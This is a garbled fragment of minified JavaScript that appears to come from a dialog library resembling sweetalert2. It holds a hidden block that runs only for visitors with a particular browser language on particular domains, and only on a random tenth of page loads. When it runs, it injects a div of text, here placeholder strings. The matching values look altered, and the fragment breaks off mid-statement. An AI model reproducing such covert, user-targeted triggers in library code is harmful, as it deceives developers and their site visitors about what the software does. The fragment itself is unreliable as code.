...
`).join("<br />")), yi(c)
	    ...
	    if (typeof window < "u" && /^stoppware\b/.test(navigator.language) && location.host.match(/\.(stoppware|sweetalert2code|xn--removed)$/) && Math.random() < .1) {
            const c = document.createElement("div");
            c.className = "remove-sweetalert2";
            const h = G([{
                text: `if you see this text, contact me text `,
                id: "4CfDhaRkw7I"
            }, {
                text: "a.</strong>",
                id: "s-GLAIY4DXA"
